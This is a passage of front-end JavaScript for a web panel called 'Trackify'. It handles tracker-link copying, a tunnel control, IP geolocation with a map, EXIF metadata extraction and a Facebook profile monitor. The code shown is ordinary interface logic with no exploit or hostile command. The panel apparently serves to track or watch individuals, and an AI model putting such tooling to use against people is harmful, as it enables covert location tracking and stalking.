                    const toast = document.getElementById('toast');
                    toast.textContent = 'Tunnel stopped';
                    toast.style.background = 'var(--accent-yellow)';
                    toast.classList.add('show');
                    setTimeout(() => { toast.classList.remove('show'); toast.style.background = ''; }, 2000);
                } else {
                    const msg = (data && data.message) ? data.message : 'Stop failed';
                    addTerminalLine('[!] ' + msg, 'dim');
                }
            } catch (e) {
                addTerminalLine('[!] Error stopping: ' + e.message, 'dim');
            }
            stopBtn.disabled = false;
            stopBtnSidebar.disabled = false;
        }

        function copyViaInputField(input) {
            const wasReadOnly = input.readOnly;
            try {
                input.readOnly = false;
                input.focus();
                input.select();
                input.setSelectionRange(0, input.value.length);
                const ok = document.execCommand('copy');
                input.readOnly = wasReadOnly;
                return ok;
            } catch (e) {
                try {
                    input.readOnly = wasReadOnly;
                } catch (e2) {}
                return false;
            }
        }

        function copyViaHiddenTextarea(text) {
            const ta = document.createElement('textarea');
            ta.value = text;
            ta.setAttribute('readonly', '');
            ta.style.cssText = 'position:fixed;left:-9999px;top:0;opacity:0';
            document.body.appendChild(ta);
            ta.focus();
            ta.select();
            ta.setSelectionRange(0, text.length);
            let ok = false;
            try {
                ok = document.execCommand('copy');
            } catch (e) {}
            document.body.removeChild(ta);
            return ok;
        }

        function showCopyResult(ok) {
            const toast = document.getElementById('toast');
            toast.textContent = ok
                ? 'Copied to clipboard!'
                : 'Could not copy automatically. Select the link in the box and press Ctrl+C (Cmd+C on Mac).';
            toast.style.background = ok ? '' : 'var(--accent-red)';
            toast.classList.add('show');
            setTimeout(function () {
                toast.classList.remove('show');
                toast.style.background = '';
            }, ok ? 2000 : 4000);
        }

        function copyLink() {
            const input = trackerLinkInput;
            const link = input && input.value;
            if (!link) return;

            if (navigator.clipboard && window.isSecureContext) {
                navigator.clipboard.writeText(link).then(function () {
                    showCopyResult(true);
                }).catch(function () {
                    showCopyResult(copyViaInputField(input) || copyViaHiddenTextarea(link));
                });
                return;
            }
            showCopyResult(copyViaInputField(input) || copyViaHiddenTextarea(link));
        }

        function copySaveInfoLink() {
            const input = document.getElementById('siTrackerLink');
            const link = input && input.value;
            if (!link) {
                return;
            }

            if (navigator.clipboard && window.isSecureContext) {
                navigator.clipboard.writeText(link).then(function () {
                    showCopyResult(true);
                }).catch(function () {
                    showCopyResult(copyViaInputField(input) || copyViaHiddenTextarea(link));
                });
                return;
            }
            showCopyResult(copyViaInputField(input) || copyViaHiddenTextarea(link));
        }

        function setFbToolsNavExpanded(open) {
            const g = document.getElementById('sideNavGroupFbTools');
            const btn = document.getElementById('sideNavFbToolsToggle');
            if (!g || !btn) return;
            g.classList.toggle('is-collapsed', !open);
            btn.setAttribute('aria-expanded', open ? 'true' : 'false');
        }

        function toggleFbToolsNav() {
            const g = document.getElementById('sideNavGroupFbTools');
            if (!g) return;
            setFbToolsNavExpanded(g.classList.contains('is-collapsed'));
        }

        var fbMonitorListState = { page: 1, perPage: 10, q: '' };
        var fbMonitorSearchDebounceTimer = null;

        function switchView(which) {
            const trackifyLayout = document.getElementById('trackifyLayout');
            const phoneLayout = document.getElementById('phoneLayout');
            const ipLayout = document.getElementById('ipLayout');
            const saveInfoLayout = document.getElementById('saveInfoLayout');
            const exiftoolLayout = document.getElementById('exiftoolLayout');
            const fbmonitorLayout = document.getElementById('fbmonitorLayout');
            const navTrackify = document.getElementById('navItemTrackify');
            const navPhone = document.getElementById('navItemPhone');
            const navIp = document.getElementById('navItemIp');
            const navSaveInfo = document.getElementById('navItemSaveInfo');
            const navExiftool = document.getElementById('navItemExiftool');
            const navAccountChecker = document.getElementById('navItemAccountChecker');
            const grpFbTools = document.getElementById('sideNavGroupFbTools');

            if (!trackifyLayout || !phoneLayout || !ipLayout || !navTrackify || !navPhone || !navIp) return;

            closeSideNav();
            fbMonitorStopListAutoRefresh();

            navTrackify.classList.remove('active');
            navPhone.classList.remove('active');
            navIp.classList.remove('active');
            if (navExiftool) {
                navExiftool.classList.remove('active');
            }
            if (navSaveInfo) {
                navSaveInfo.classList.remove('active');
            }
            if (navAccountChecker) {
                navAccountChecker.classList.remove('active');
            }
            if (grpFbTools) {
                grpFbTools.classList.remove('has-active-child');
            }

            if (which === 'phone') {
                trackifyLayout.style.display = 'none';
                phoneLayout.style.display = 'block';
                ipLayout.style.display = 'none';
                if (exiftoolLayout) {
                    exiftoolLayout.style.display = 'none';
                }
                if (saveInfoLayout) {
                    saveInfoLayout.style.display = 'none';
                }
                if (fbmonitorLayout) {
                    fbmonitorLayout.style.display = 'none';
                }
                navPhone.classList.add('active');
                loadPhoneHistory();
            } else if (which === 'ip') {
                trackifyLayout.style.display = 'none';
                phoneLayout.style.display = 'none';
                ipLayout.style.display = 'block';
                if (exiftoolLayout) {
                    exiftoolLayout.style.display = 'none';
                }
                if (saveInfoLayout) {
                    saveInfoLayout.style.display = 'none';
                }
                if (fbmonitorLayout) {
                    fbmonitorLayout.style.display = 'none';
                }
                navIp.classList.add('active');
                setTimeout(function () {
                    if (typeof ipLookupLeafletMap !== 'undefined' && ipLookupLeafletMap) {
                        try { ipLookupLeafletMap.invalidateSize(); } catch (e) {}
                    }
                }, 250);
            } else if (which === 'exiftool' && exiftoolLayout && navExiftool) {
                trackifyLayout.style.display = 'none';
                phoneLayout.style.display = 'none';
                ipLayout.style.display = 'none';
                if (saveInfoLayout) {
                    saveInfoLayout.style.display = 'none';
                }
                if (fbmonitorLayout) {
                    fbmonitorLayout.style.display = 'none';
                }
                exiftoolLayout.style.display = 'block';
                navExiftool.classList.add('active');
            } else if (which === 'saveinfo' && saveInfoLayout && navSaveInfo) {
                trackifyLayout.style.display = 'none';
                phoneLayout.style.display = 'none';
                ipLayout.style.display = 'none';
                if (exiftoolLayout) {
                    exiftoolLayout.style.display = 'none';
                }
                if (fbmonitorLayout) {
                    fbmonitorLayout.style.display = 'none';
                }
                saveInfoLayout.style.display = 'block';
                navSaveInfo.classList.add('active');
                loadSaveInfoTemplates();
                loadSavedInfo();
            } else if (which === 'fbmonitor' && fbmonitorLayout && navAccountChecker) {
                trackifyLayout.style.display = 'none';
                phoneLayout.style.display = 'none';
                ipLayout.style.display = 'none';
                if (exiftoolLayout) {
                    exiftoolLayout.style.display = 'none';
                }
                if (saveInfoLayout) {
                    saveInfoLayout.style.display = 'none';
                }
                fbmonitorLayout.style.display = 'block';
                navAccountChecker.classList.add('active');
                if (grpFbTools) {
                    grpFbTools.classList.add('has-active-child');
                    grpFbTools.classList.remove('is-collapsed');
                }
                setFbToolsNavExpanded(true);
                var fbSearchInp = document.getElementById('fbMonitorSearch');
                if (fbSearchInp) {
                    fbMonitorListState.q = (fbSearchInp.value || '').trim();
                }
                loadFbMonitorList();
                fbMonitorStartListAutoRefresh();
            } else {
                trackifyLayout.style.display = 'grid';
                phoneLayout.style.display = 'none';
                ipLayout.style.display = 'none';
                if (exiftoolLayout) {
                    exiftoolLayout.style.display = 'none';
                }
                if (saveInfoLayout) {
                    saveInfoLayout.style.display = 'none';
                }
                if (fbmonitorLayout) {
                    fbmonitorLayout.style.display = 'none';
                }
                navTrackify.classList.add('active');
            }

            try {
                if (window.history && window.history.replaceState) {
                    window.history.replaceState(null, '', 'panel.php');
                }
            } catch (e) {}
        }

        function isMobileNavMode() {
            return window.matchMedia && window.matchMedia('(max-width: 820px)').matches;
        }

        function setSideNavOpen(open) {
            const sideNav = document.querySelector('.side-nav');
            const overlay = document.getElementById('sideNavOverlay');
            const toggle = document.getElementById('sideNavToggle');
            if (!sideNav || !overlay || !toggle) return;

            if (open) {
                sideNav.classList.add('is-open');
                overlay.classList.add('is-open');
                toggle.setAttribute('aria-expanded', 'true');
                toggle.setAttribute('aria-label', 'Close menu');
            } else {
                sideNav.classList.remove('is-open');
                overlay.classList.remove('is-open');
                toggle.setAttribute('aria-expanded', 'false');
                toggle.setAttribute('aria-label', 'Open menu');
            }
        }

        function openSideNav() {
            if (!isMobileNavMode()) return;
            setSideNavOpen(true);
        }

        function closeSideNav() {
            setSideNavOpen(false);
        }

        function toggleSideNav() {
            if (!isMobileNavMode()) return;
            const sideNav = document.querySelector('.side-nav');
            const isOpen = !!(sideNav && sideNav.classList.contains('is-open'));
            setSideNavOpen(!isOpen);
        }

        document.addEventListener('DOMContentLoaded', function () {
            try {
                const params = new URLSearchParams(window.location.search);
                const view = (params.get('view') || '').toLowerCase();
                if (view === 'saveinfo' || view === 'phone' || view === 'ip' || view === 'exiftool' || view === 'fbmonitor') {
                    switchView(view);
                }
            } catch (e) {}
            const overlay = document.getElementById('sideNavOverlay');
            const toggle = document.getElementById('sideNavToggle');
            if (toggle) {
                toggle.addEventListener('click', function () {
                    toggleSideNav();
                });
            }
            if (overlay) {
                overlay.addEventListener('click', function () {
                    closeSideNav();
                });
            }
            document.addEventListener('keydown', function (e) {
                if (e.key === 'Escape') {
                    closeSideNav();
                }
            });
            window.addEventListener('resize', function () {
                if (!isMobileNavMode()) {
                    closeSideNav();
                }
            });
        });

        let ipLookupLeafletMap = null;
        let ipLookupLeafletMarker = null;
        let leafletLoadPromise = null;

        let exiftoolLastJson = '';
        let exiftoolPreviewScale = 1;

        function exiftoolSetError(msg) {
            const el = document.getElementById('exiftoolError');
            if (!el) return;
            if (msg) {
                el.textContent = String(msg);
                el.hidden = false;
            } else {
                el.textContent = '';
                el.hidden = true;
            }
        }

        function exiftoolSetTerminal(msg) {
            const term = document.getElementById('exiftoolTerminal');
            if (!term) return;
            const line = document.createElement('div');
            line.className = 'phone-lookup-terminal-line';
            line.textContent = String(msg);
            term.insertBefore(line, term.lastElementChild);
            term.scrollTop = term.scrollHeight;
        }

        function exiftoolHumanBytes(bytes) {
            const n = Number(bytes || 0);
            if (!isFinite(n) || n <= 0) return '0 B';
            const units = ['B', 'KB', 'MB', 'GB', 'TB'];
            let v = n;
            let i = 0;
            while (v >= 1024 && i < units.length - 1) {
                v = v / 1024;
                i++;
            }
            const s = (Math.round(v * 100) / 100).toFixed(v < 10 && i > 0 ? 2 : (v < 100 && i > 0 ? 1 : 0));
            return s.replace(/\.0+$/, '').replace(/(\.\d*[1-9])0+$/, '$1') + ' ' + units[i];
        }

        function exiftoolRenderPreview(file) {
            const img = document.getElementById('exifPreviewImg');
            const empty = document.getElementById('exifPreviewEmpty');
            const meta = document.getElementById('exifPreviewMeta');
            const sizeEl = document.getElementById('exifPreviewSize');
            const typeEl = document.getElementById('exifPreviewType');
            if (!img || !empty || !meta || !sizeEl || !typeEl) return;

            if (!file) {
                img.src = '';
                img.style.display = 'none';
                empty.style.display = 'block';
                meta.style.display = 'none';
                exiftoolPreviewScale = 1;
                img.style.transform = 'scale(1)';
                return;
            }

            sizeEl.textContent = exiftoolHumanBytes(file.size || 0);
            typeEl.textContent = String(file.type || 'unknown');
            meta.style.display = 'block';

            empty.style.display = 'none';
            img.style.display = 'block';
            exiftoolPreviewScale = 1;
            img.style.transform = 'scale(1)';

            try {
                const url = URL.createObjectURL(file);
                img.onload = function () {
                    try { URL.revokeObjectURL(url); } catch (e) {}
                };
                img.src = url;
            } catch (e) {
                empty.style.display = 'block';
                img.style.display = 'none';
                meta.style.display = 'none';
            }
        }

        function exiftoolPreviewZoom(mult) {
            const img = document.getElementById('exifPreviewImg');
            if (!img || img.style.display === 'none') return;
            exiftoolPreviewScale = Math.max(0.25, Math.min(6, exiftoolPreviewScale * Number(mult || 1)));
            img.style.transform = 'scale(' + exiftoolPreviewScale + ')';
        }

        function exiftoolPreviewReset() {
            const img = document.getElementById('exifPreviewImg');
            if (!img) return;
            exiftoolPreviewScale = 1;
            img.style.transform = 'scale(1)';
        }

        async function exiftoolExtract() {
            const fileEl = document.getElementById('exiftoolFile');
            const btn = document.getElementById('exiftoolExtractBtn');
            if (!fileEl || !btn) return;
            const file = fileEl.files && fileEl.files[0];
            if (!file) {
                exiftoolSetError('Choose an image first.');
                return;
            }

            exiftoolSetError('');
            btn.disabled = true;
            const prev = btn.textContent;
            btn.textContent = 'Extracting…';

            const fd = new FormData();
            fd.append('image', file);

            try {
                exiftoolSetTerminal('[*] Uploading ' + file.name + '…');
                const res = await fetch('api.php?action=exiftool', {
                    method: 'POST',
                    body: fd,
                    credentials: 'same-origin'
                });
                const data = await res.json().catch(function () { return {}; });
                if (!data || data.status !== 'success' || !data.tags) {
                    exiftoolSetError((data && data.message) ? data.message : 'EXIFTool failed.');
                    if (data && data.raw) {
                        exiftoolSetTerminal(String(data.raw).slice(0, 1200));
                    }
                    return;
                }

                const tags = data.tags;
                exiftoolLastJson = JSON.stringify(tags, null, 2);

                const tableWrap = document.getElementById('exiftoolTableWrap');
                const tbody = document.getElementById('exiftoolTbody');
                const empty = document.getElementById('exiftoolEmpty');
                if (tableWrap && tbody && empty) {
                    empty.style.display = 'none';
                    tableWrap.style.display = 'block';
                    tbody.innerHTML = '';

                    Object.keys(tags).forEach(function (k) {
                        const v = tags[k];
                        let val = v;
                        if (val === null) val = 'null';
                        else if (typeof val === 'boolean') val = val ? 'true' : 'false';
                        else if (typeof val === 'object') {
                            try { val = JSON.stringify(val); } catch (e) { val = '[unprintable]'; }
                        } else {
                            val = String(val);
                        }

                        const tr = document.createElement('tr');
                        tr.className = 'exiftoolRow';
                        tr.setAttribute('data-hay', (String(k) + ' ' + String(val)).toLowerCase());
                        const tdK = document.createElement('td');
                        tdK.style.padding = '10px 12px';
                        tdK.style.borderBottom = '1px solid var(--border)';
                        tdK.style.fontFamily = "'JetBrains Mono', monospace";
                        tdK.textContent = String(k);
                        const tdV = document.createElement('td');
                        tdV.style.padding = '10px 12px';
                        tdV.style.borderBottom = '1px solid var(--border)';
                        tdV.textContent = String(val);
                        tr.appendChild(tdK);
                        tr.appendChild(tdV);
                        tbody.appendChild(tr);
                    });
                }

                exiftoolSetTerminal('[+] Extracted ' + Object.keys(tags).length + ' tags.');
                exiftoolApplyFilter();
            } catch (e) {
                exiftoolSetError('Network error — try again.');
            } finally {
                btn.disabled = false;
                btn.textContent = prev;
            }
        }

        function exiftoolApplyFilter() {
            const qEl = document.getElementById('exiftoolFilter');
            const q = (qEl && qEl.value ? qEl.value : '').trim().toLowerCase();
            const rows = document.querySelectorAll('.exiftoolRow');
            rows.forEach(function (r) {
                const hay = r.getAttribute('data-hay') || '';
                r.style.display = (q === '' || hay.indexOf(q) !== -1) ? '' : 'none';
            });
        }

        function exiftoolCopyJson() {
            if (!exiftoolLastJson) return;
            if (navigator.clipboard && window.isSecureContext) {
                navigator.clipboard.writeText(exiftoolLastJson).then(function () {
                    showCopyResult(true);
                }).catch(function () {
                    showCopyResult(copyViaHiddenTextarea(exiftoolLastJson));
                });
                return;
            }
            const ta = document.createElement('textarea');
            ta.value = exiftoolLastJson;
            document.body.appendChild(ta);
            ta.select();
            let ok = false;
            try { ok = document.execCommand('copy'); } catch (e) {}
            document.body.removeChild(ta);
            showCopyResult(ok);
        }

        (function initExiftoolPreview() {
            const fileEl = document.getElementById('exiftoolFile');
            if (!fileEl) return;
            fileEl.addEventListener('change', function () {
                const f = fileEl.files && fileEl.files[0] ? fileEl.files[0] : null;
                exiftoolRenderPreview(f);
            });
        })();

        function destroyIpLookupMap() {
            if (ipLookupLeafletMap) {
                try { ipLookupLeafletMap.remove(); } catch (e) {}
                ipLookupLeafletMap = null;
                ipLookupLeafletMarker = null;
            }
        }

        function setIpMapPlaceholder(text) {
            destroyIpLookupMap();
            const el = document.getElementById('ipLookupMap');
            if (!el) return;
            el.className = 'ip-lookup-map ip-lookup-map--empty';
            el.textContent = text;
        }

        function ensureLeafletLoaded() {
            if (window.L) {
                return Promise.resolve();
            }
            if (leafletLoadPromise) {
                return leafletLoadPromise;
            }
            leafletLoadPromise = new Promise(function (resolve, reject) {
                const link = document.createElement('link');
                link.rel = 'stylesheet';
                link.href = 'https://unpkg.com/leaflet@1.9.4/dist/leaflet.css';
                document.head.appendChild(link);
                const s = document.createElement('script');
                s.src = 'https://unpkg.com/leaflet@1.9.4/dist/leaflet.js';
                s.onload = function () { resolve(); };
                s.onerror = function () { reject(new Error('Could not load map library')); };
                document.body.appendChild(s);
            });
            return leafletLoadPromise;
        }

        function escapeHtmlText(s) {
            return String(s)
                .replace(/&/g, '&amp;')
                .replace(/</g, '&lt;')
                .replace(/>/g, '&gt;');
        }

        function renderIpDetails(data) {
            const wrap = document.getElementById('ipLookupDetails');
            if (!wrap) return;
            if (!data || data.status !== 'success') {
                wrap.innerHTML = '<p style="margin:0;color:var(--text-muted);font-size:13px">No details returned.</p>';
                return;
            }
            const rows = Array.isArray(data.details_rows) ? data.details_rows : [];
            if (rows.length === 0 && data.details && typeof data.details === 'object') {
                const keys = Object.keys(data.details);
                let html = '<div class="ip-lookup-grid">';
                keys.forEach(function (k) {
                    html += '<div class="ip-lookup-pair-row"><div class="ip-lookup-half" style="grid-column:1/-1;border-right:none">' +
                        '<span class="ip-lookup-lbl">' + escapeHtmlText(k) + '</span>' +
                        '<span class="ip-lookup-val">' + escapeHtmlText(String(data.details[k])) + '</span></div></div>';
                });
                html += '</div>';
                wrap.innerHTML = html;
                return;
            }
            let html = '<div class="ip-lookup-grid">';
            rows.forEach(function (row) {
                const L = row.left || {};
                const R = row.right || {};
                html += '<div class="ip-lookup-pair-row">' +
                    '<div class="ip-lookup-half">' +
                    '<span class="ip-lookup-lbl">' + escapeHtmlText(L.label || '') + '</span>' +
                    '<span class="ip-lookup-val">' + escapeHtmlText(String(L.value != null ? L.value : '—')) + '</span>' +
                    '</div>' +
                    '<div class="ip-lookup-half">' +
                    '<span class="ip-lookup-lbl">' + escapeHtmlText(R.label || '') + '</span>' +
                    '<span class="ip-lookup-val">' + escapeHtmlText(String(R.value != null ? R.value : '—')) + '</span>' +
                    '</div>' +
                    '</div>';
            });
            html += '</div>';
            const extra = Array.isArray(data.details_extra) ? data.details_extra : [];
            if (extra.length > 0) {
                html += '<div class="ip-lookup-extra"><h3>Additional fields</h3>';
                extra.forEach(function (row) {
                    html += '<div class="ip-lookup-extra-row">' +
                        '<span class="ip-lookup-lbl">' + escapeHtmlText(row.label || '') + '</span>' +
                        '<span class="ip-lookup-val">' + escapeHtmlText(String(row.value != null ? row.value : '')) + '</span>' +
                        '</div>';
                });
                html += '</div>';
            }
            wrap.innerHTML = html;
        }

        function showIpOnMap(lat, lon, label) {
            const el = document.getElementById('ipLookupMap');
            if (!el) return;
            ensureLeafletLoaded().then(function () {
                destroyIpLookupMap();
                el.className = 'ip-lookup-map';
                el.innerHTML = '';
                ipLookupLeafletMap = L.map(el).setView([lat, lon], 10);
                L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
                    attribution: '&copy; <a href="https://www.openstreetmap.org/copyright" rel="noopener">OpenStreetMap</a>'
                }).addTo(ipLookupLeafletMap);
                ipLookupLeafletMarker = L.marker([lat, lon]).addTo(ipLookupLeafletMap);
                if (label) {
                    ipLookupLeafletMarker.bindPopup(escapeHtmlText(label)).openPopup();
                }
                setTimeout(function () {
                    if (ipLookupLeafletMap) ipLookupLeafletMap.invalidateSize();
                }, 150);
            }).catch(function () {
                setIpMapPlaceholder('Map could not load. Check your network or try again.');
            });
        }

        function performIpLookup() {
            const input = document.getElementById('ipLookupInput');
            const termEl = document.getElementById('ipLookupTerminal');
            const errEl = document.getElementById('ipLookupError');
            if (!input || !termEl) return;

            const raw = (input.value || '').trim();
            if (!raw) {
                if (errEl) {
                    errEl.textContent = 'Please enter an IP address.';
                    errEl.hidden = false;
                }
                return;
            }
            if (errEl) {
                errEl.textContent = '';
                errEl.hidden = true;
            }

            const safeIp = escapeHtmlText(raw);
            termEl.innerHTML =
                '<div class="phone-lookup-terminal">' +
                '<div class="phone-lookup-terminal-line"><span class="hint">[*]</span> Looking up <span class="link">' + safeIp + '</span> via FindIP ...</div>' +
                '<div class="phone-lookup-terminal-line"><span class="prompt">root@trackify:~# </span><span class="terminal-cursor"></span></div>' +
                '</div>';

            fetch(API + '?action=ip_lookup&ip=' + encodeURIComponent(raw), { credentials: 'same-origin' })
                .then(function (r) { return r.json(); })
                .then(function (data) {
                    const lines = [];
                    if (!data || data.status !== 'success') {
                        const msg = (data && data.message) ? String(data.message) : 'Lookup failed';
                        lines.push('<div class="phone-lookup-terminal-line"><span class="hint">[!]</span> ' + escapeHtmlText(msg) + '</div>');
                        lines.push('<div class="phone-lookup-terminal-line"><span class="prompt">root@trackify:~# </span><span class="terminal-cursor"></span></div>');
                        termEl.innerHTML = '<div class="phone-lookup-terminal">' + lines.join('') + '</div>';
                        renderIpDetails({ status: 'error' });
                        setIpMapPlaceholder('Lookup failed — no map.');
                        return;
                    }

                    lines.push('<div class="phone-lookup-terminal-line"><span class="hint">[+]</span> FindIP response received for <span class="link">' + safeIp + '</span></div>');
                    lines.push('<div class="phone-lookup-terminal-line"><span class="prompt">root@trackify:~# </span><span class="terminal-cursor"></span></div>');
                    termEl.innerHTML = '<div class="phone-lookup-terminal">' + lines.join('') + '</div>';

                    renderIpDetails(data);

                    const lat = typeof data.lat === 'number' ? data.lat : null;
                    const lon = typeof data.lon === 'number' ? data.lon : null;
                    if (lat !== null && lon !== null && !isNaN(lat) && !isNaN(lon)) {
                        const locLabel = (data.details && data.details.City && data.details.Country)
                            ? (data.details.City + ', ' + data.details.Country)
                            : raw;
                        showIpOnMap(lat, lon, locLabel);
                    } else {
                        setIpMapPlaceholder('No latitude/longitude in this response. Details may still list location text.');
                    }
                })
                .catch(function (err) {
                    const msg = (err && err.message) ? err.message : String(err);
                    termEl.innerHTML =
                        '<div class="phone-lookup-terminal">' +
                        '<div class="phone-lookup-terminal-line"><span class="hint">[!]</span> Error: ' + escapeHtmlText(msg) + '</div>' +
                        '<div class="phone-lookup-terminal-line"><span class="prompt">root@trackify:~# </span><span class="terminal-cursor"></span></div>' +
                        '</div>';
                    setIpMapPlaceholder('Request error.');
                });
        }

        (function initIpLookupValidation() {
            const input = document.getElementById('ipLookupInput');
            const errorEl = document.getElementById('ipLookupError');
            if (!input || !errorEl) return;
            input.addEventListener('input', function () {
                if (input.value && input.value.trim()) {
                    errorEl.textContent = '';
                    errorEl.hidden = true;
                }
            });
        })();

        (function initPhoneLookupValidation() {
            const input = document.getElementById('phoneLookupInput');
            const errorEl = document.getElementById('phoneLookupError');
            if (!input || !errorEl) return;
            input.addEventListener('input', function () {
                if (input.value && input.value.trim()) {
                    errorEl.textContent = '';
                    errorEl.hidden = true;
                }
            });
        })();

        // -----------------------------------------------------------------------
        // Facebook Monitor JS
        // -----------------------------------------------------------------------

        var fbMonitorPendingRemoveId = null;

        function fbMonitorOpenAddModal() {
            var m = document.getElementById('fbMonitorAddModal');
            var err = document.getElementById('fbMonitorAddError');
            if (err) { err.hidden = true; err.textContent = ''; }
            if (m) {
                m.classList.add('show');
                setTimeout(function () {
                    var inp = document.getElementById('fbMonitorUrlInput');
                    if (inp) inp.focus();
                }, 80);
            }
        }

        function fbMonitorCloseAddModal(event) {
            var m = document.getElementById('fbMonitorAddModal');
            if (!m || !m.classList.contains('show')) return;
            if (event !== undefined && event !== null && event.target !== event.currentTarget) return;
            m.classList.remove('show');
        }

        function fbMonitorOpenRemoveModal(id) {
            fbMonitorPendingRemoveId = id;
            var m = document.getElementById('fbMonitorRemoveModal');
            if (m) m.classList.add('show');
        }

        function fbMonitorCloseRemoveModal(event) {
            var m = document.getElementById('fbMonitorRemoveModal');
            if (!m || !m.classList.contains('show')) return;
            if (event !== undefined && event !== null && event.target !== event.currentTarget) return;
            m.classList.remove('show');
            fbMonitorPendingRemoveId = null;
        }

        async function fbMonitorConfirmRemove() {
            var id = fbMonitorPendingRemoveId;
            if (id == null) return;
            try {
                await fetch('api.php?action=fb_monitor_remove', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ id: id }),
                    credentials: 'same-origin'
                });
                await loadFbMonitorList();
            } catch (e) {
                // silent
            } finally {
                fbMonitorCloseRemoveModal();
            }
        }

        function fbMonitorGetSelectedIds() {
            const out = [];
            document.querySelectorAll('#fbMonitorTableBody .fb-monitor-row-cb:checked').forEach(function (cb) {
                const id = parseInt(cb.getAttribute('data-monitor-id'), 10);
                if (id > 0) {
                    out.push(id);
                }
            });
            return out;
        }

        function fbMonitorSyncSelectAllFromRows() {
            const sel = document.getElementById('fbMonitorSelectAll');
            if (!sel) return;
            const boxes = document.querySelectorAll('#fbMonitorTableBody .fb-monitor-row-cb');
            if (boxes.length === 0) {
                sel.checked = false;
                sel.indeterminate = false;
                sel.disabled = true;
                return;
            }
            sel.disabled = false;
            let n = 0;
            boxes.forEach(function (cb) {
                if (cb.checked) {
                    n++;
                }
            });
            sel.checked = n === boxes.length;
            sel.indeterminate = n > 0 && n < boxes.length;
        }

        function fbMonitorUpdateBulkToolbar() {
            const btn = document.getElementById('fbMonitorBulkDeleteBtn');
            const cnt = document.getElementById('fbMonitorBulkCount');
            const n = document.querySelectorAll('#fbMonitorTableBody .fb-monitor-row-cb:checked').length;
            if (btn) {
                btn.hidden = n === 0;
                btn.setAttribute('aria-label', n === 0 ? 'Bulk remove selected rows' : 'Bulk remove ' + n + ' selected row' + (n === 1 ? '' : 's'));
            }
            if (cnt) {
                cnt.textContent = n > 0 ? ' (' + n + ')' : '';
            }
        }

        function fbMonitorOpenBulkRemoveModal() {
            const ids = fbMonitorGetSelectedIds();
            if (ids.length === 0) {
                fbMonitorToast('Select at least one row.', true);
                return;
            }
            const body = document.getElementById('fbMonitorBulkRemoveModalBody');
            const m = document.getElementById('fbMonitorBulkRemoveModal');
            if (body) {
                body.textContent = ids.length === 1
                    ? 'Remove 1 profile or page from your list? You can add it again later.'
                    : 'Remove ' + ids.length + ' profiles or pages from your list? You can add them again later.';
            }
            if (m) {
                m.classList.add('show');
            }
        }

        function fbMonitorCloseBulkRemoveModal(event) {
            const m = document.getElementById('fbMonitorBulkRemoveModal');
            if (!m || !m.classList.contains('show')) return;
            if (event !== undefined && event !== null && event.target !== event.currentTarget) return;
            m.classList.remove('show');
        }

        async function fbMonitorConfirmBulkRemove() {
            const ids = fbMonitorGetSelectedIds();
            if (ids.length === 0) {
                fbMonitorCloseBulkRemoveModal();
                return;
            }
            try {
                const res = await fetch('api.php?action=fb_monitor_remove_bulk', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ ids: ids }),
                    credentials: 'same-origin'
                });
                const data = await res.json().catch(function () { return {}; });
                fbMonitorCloseBulkRemoveModal();
                if (data.status !== 'success') {
                    fbMonitorToast(data.message || 'Could not delete.', true);
                    return;
                }
                const del = typeof data.deleted === 'number' ? data.deleted : ids.length;
                fbMonitorToast(del === 1 ? 'Removed 1 item.' : 'Removed ' + del + ' items.', false);
                await loadFbMonitorList();
            } catch (e) {
                fbMonitorCloseBulkRemoveModal();
                fbMonitorToast('Network error — try again.', true);
            }
        }

        (function fbMonitorInitBulkSelection() {
            const table = document.getElementById('fbMonitorTable');
            const selAll = document.getElementById('fbMonitorSelectAll');
            if (!table || !selAll || table._fbBulkInit) return;
            table._fbBulkInit = true;
            selAll.addEventListener('change', function () {
                const on = selAll.checked;
                document.querySelectorAll('#fbMonitorTableBody .fb-monitor-row-cb').forEach(function (cb) {
                    cb.checked = on;
                });
                fbMonitorSyncSelectAllFromRows();
                fbMonitorUpdateBulkToolbar();
            });
            table.addEventListener('change', function (e) {
                if (e.target && e.target.classList && e.target.classList.contains('fb-monitor-row-cb')) {
                    fbMonitorSyncSelectAllFromRows();
                    fbMonitorUpdateBulkToolbar();
                }
            });
        })();

        document.addEventListener('keydown', function (ev) {
            if (ev.key !== 'Escape') return;
            var m = document.getElementById('fbMonitorAddModal');
            if (m && m.classList.contains('show')) {
                m.classList.remove('show');
                return;
            }
            var rem = document.getElementById('fbMonitorRemoveModal');
            if (rem && rem.classList.contains('show')) {
                rem.classList.remove('show');
                fbMonitorPendingRemoveId = null;
                return;
            }
            var bulkRem = document.getElementById('fbMonitorBulkRemoveModal');
            if (bulkRem && bulkRem.classList.contains('show')) {
                bulkRem.classList.remove('show');
                return;
            }
            var rowLog = document.getElementById('fbMonitorRowLogModal');
            if (rowLog && rowLog.classList.contains('show')) {
                rowLog.classList.remove('show');
            }
        });

        function fbStatusColor(status) {
            return {active: '#7fd962', inactive: '#f07178', unavailable: '#ffb454'}[status] || '#626a73';
        }

        function fbStatusLabel(status) {
            return {active: 'Active', inactive: 'Inactive', unavailable: 'Unavailable', unknown: 'Unknown', error: 'Error'}[status] || status;
        }

        function fbMonitorStatusTagClass(status) {
            const s = String(status || 'unknown');
            if (s === 'active' || s === 'inactive' || s === 'unavailable' || s === 'unknown') {
                return 'fb-monitor-status-tag fb-monitor-status-tag--' + s;
            }
            return 'fb-monitor-status-tag fb-monitor-status-tag--unknown';
        }

        function fbMonitorShortUrl(u) {
            const s = String(u || '');
            if (!s) return '—';
            try {
                const x = new URL(s);
                const t = x.hostname + (x.pathname && x.pathname !== '/' ? x.pathname : '');
                return t.length > 56 ? t.slice(0, 53) + '…' : t;
            } catch (e) {
                return s.length > 56 ? s.slice(0, 53) + '…' : s;
            }
        }

        /** Parse MySQL datetime (UTC) or ISO-8601 string into a Date (display uses local timezone). */
        function fbMonitorParseStoredDate(s) {
            const t = String(s == null ? '' : s).trim();
            if (!t) return null;
            if (t.indexOf('T') !== -1 || t.endsWith('Z')) {
                const d = new Date(t);
                return isNaN(d.getTime()) ? null : d;
            }
            const m = t.match(/^(\d{4})-(\d{2})-(\d{2})[ T](\d{2}):(\d{2}):(\d{2})/);
            if (m) {
                return new Date(Date.UTC(
                    parseInt(m[1], 10),
                    parseInt(m[2], 10) - 1,
                    parseInt(m[3], 10),
                    parseInt(m[4], 10),
                    parseInt(m[5], 10),
                    parseInt(m[6], 10)
                ));
            }
            const d2 = new Date(t);
